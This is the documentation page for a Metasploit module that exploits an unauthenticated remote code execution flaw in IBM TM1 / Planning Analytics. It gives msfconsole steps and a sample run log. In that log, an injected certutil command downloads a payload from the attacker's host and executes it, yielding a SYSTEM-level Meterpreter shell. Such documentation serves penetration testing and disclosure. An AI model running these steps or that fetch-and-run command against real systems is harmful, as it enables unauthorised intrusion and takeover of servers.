{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/ibm_tm1_unauth_rce","result":{"data":{"moduleMetadataJson":{"id":"23ec89ba-9458-5ddd-8ee2-226300588ccc","name":"IBM TM1 / Planning Analytics Unauthenticated Remote Code Execution","fullname":"exploit/multi/misc/ibm_tm1_unauth_rce","description":"This module exploits a vulnerability in IBM TM1 / Planning Analytics that allows\n        an unauthenticated attacker to perform a configuration overwrite.\n        It starts by querying the Admin server for the available applications, picks one,\n        and then exploits it. You can also provide an application name to bypass this step,\n        and exploit the application directly.\n        The configuration overwrite is used to change an application server authentication\n        method to \"CAM\", a proprietary IBM auth method, which is simulated by the exploit.\n        The exploit then performs a fake authentication as admin, and finally abuses TM1\n        scripting to perform a command injection as root or SYSTEM.\n        Testing was done on IBM PA 2.0.6 and IBM TM1 10.2.2 on Windows and Linux.\n        Versions up to and including PA 2.0.8 are vulnerable. It is likely that versions\n        earlier than TM1 10.2.2 are also vulnerable (10.2.2 was released in 2014).","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/ibm_tm1_unauth_rce","documentationSlug":"/modules/documentation/exploit/multi/misc/ibm_tm1_unauth_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>This module exploits a vulnerability in IBM TM1 / Planning Analytics that allows an unauthenticated attacker to perform a configuration overwrite.\nIt starts by querying the Admin server for the available applications, picks one, and then exploits it. You can also provide an application name to bypass this step, and exploit the application directly.\nThe configuration overwrite is used to change an application server authentication method to \"CAM\", a proprietary IBM auth method, which is simulated by the exploit.\nThe exploit then performs a fake authentication as admin, and finally abuses TM1 scripting to perform a command injection as root or SYSTEM.</p>\n<p>This module starts by querying the Admin server, which usually runs on port 5498 with SSL enabled, or 5495 without SSL. This can be queried by a normal client without authentication, and with that we retrieve a list of applications, the servers where they are running, the ports where they are running, and if they use SSL or not.</p>\n<p>Note that there might be cases where the applications do not run on the same host as the Admin server; however this is expected to be rare. Even in that case, the exploit should work perfectly, as it uses the information from the Admin server to connect to the Application server host, and automatically sets up SSL if needed.</p>\n<p>If you know the application name, port and SSL status, you can enter this directly into the exploit, which then will not perform the Admin server query. For this, enter the application port in the <code class=\"language-text\">RPORT</code> option, whether it uses SSL in the <code class=\"language-text\">SSL</code> option, and finally set <code class=\"language-text\">APP_NAME</code> to the application name.</p>\n<p>Testing was done on IBM PA 2.0.6 and IBM TM1 10.2.2 on Windows and Linux.</p>\n<p>Versions up to and including PA 2.0.8 are vulnerable. It is likely that versions earlier than TM1 10.2.2 are also vulnerable (10.2.2 was released in 2014).</p>\n<p>Users are encouraged to share success stories with the module author, Pedro Ribeiro (pedrib@gmail.com) from Agile Information Security. For more information, check the full advisory at <a href=\"https://raw.githubusercontent.com/pedrib/PoC/master/advisories/ibm-tm1-rce.txt\">https://raw.githubusercontent.com/pedrib/PoC/master/advisories/ibm-tm1-rce.txt</a>.</p>\n<h3 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h3>\n<p>To obtain the vulnerable application you need an official IBM installer for IBM Planning Analytics or IBM TM1. This exploit works perfectly for both Windows and Linux targets.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use [module path]</code></li>\n<li>Do: <code class=\"language-text\">set srvhost [lhost]</code></li>\n<li>Do: <code class=\"language-text\">set target [0|1]</code></li>\n<li>Do: <code class=\"language-text\">set rhost [rhost]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>SSL</strong></p>\n<p>Whether to use SSL to connect to the Admin / Application server (default true)</p>\n<p><strong>APP_NAME</strong></p>\n<p>Application name to use to connect directly, bypassing Admin server query (default unset).</p>\n<p><strong>AUTH_ATTEMPTS</strong></p>\n<p>Number of attempts to authentication to the fake CAM server (default 10).</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Started reverse TCP handler on 192.168.1.1:4444\n[*] 192.168.1.138:5498 - Connecting to admin server and obtaining application data\n[+] 192.168.1.138:5498 - Found app GO_New_Stores tcp ip: 192.168.1.138 port: 45557 available: 1 SSL: 1\n[+] 192.168.1.138:5498 - Found app GO_Scorecards tcp ip: 192.168.1.138 port: 54321 available: 1 SSL: 1\n[+] 192.168.1.138:5498 - Found app Planning Sample tcp ip: 192.168.1.138 port: 12345 available: 1 SSL: 1\n[+] 192.168.1.138:5498 - Found app proven_techniques tcp ip: 192.168.1.138 port: 17797 available: 1 SSL: 1\n[+] 192.168.1.138:5498 - Found app SData tcp ip: 192.168.1.138 port: 12346 available: 1 SSL: 1\n[*] 192.168.1.138:5498 - Picked SData as our target, connecting...\n[+] 192.168.1.138:5498 - Current auth method is 1, we&#39;re good to go!\n[*] 192.168.1.138:5498 - Starting up the fake CAM server...\n[*] 192.168.1.138:5498 - Using URL: http://192.168.1.1:4466/\n[*] 192.168.1.138:5498 - Changing authentication method to 4 (CAM auth)\n[*] 192.168.1.138:5498 - Authenticating using CAM Passport and our fake CAM Service...\n[+] 192.168.1.138:5498 - CAM: Received first CAM query, responding with account info\n[+] 192.168.1.138:5498 - CAM: Received second CAM query, responding with session info\n[+] 192.168.1.138:5498 - CAM: Received third CAM query, responding with random garbage\n[*] 192.168.1.138:5498 - Creating our Process object...\n[*] 192.168.1.138:5498 - Adding command :&quot;certutil.exe -urlcache -split -f http://192.168.1.1:4466/ C:\\Windows\\Temp\\KWFUmh.exe&quot; to the Process object...\n[*] 192.168.1.138:5498 - Adding command :&quot;C:\\Windows\\Temp\\KWFUmh.exe&quot; to the Process object...\n[*] 192.168.1.138:5498 - Registering the Process object under the name &#39;cRKnsLzFFwDI&#39;\n[*] 192.168.1.138:5498 - Now let&#39;s execute the Process object!\n[+] 192.168.1.138:5498 - CAM: Received request for payload executable, shell incoming!\n[+] 192.168.1.138:5498 - CAM: Received request for payload executable, shell incoming!\n[*] Sending stage (180291 bytes) to 192.168.1.138\n[*] Meterpreter session 6 opened (192.168.1.1:4444 -&gt; 192.168.1.138:49306) at 2020-03-27 12:24:55 +0700\n[*] 192.168.1.138:5498 - Restoring original authentication method 1\n[*] 192.168.1.138:5498 - Server stopped.\n[!] 192.168.1.138:5498 - This exploit may require manual cleanup of &#39;C:\\Windows\\Temp\\KWFUmh.exe&#39; on the target\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; exit\n[*] Shutting down Meterpreter...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"23ec89ba-9458-5ddd-8ee2-226300588ccc"}}}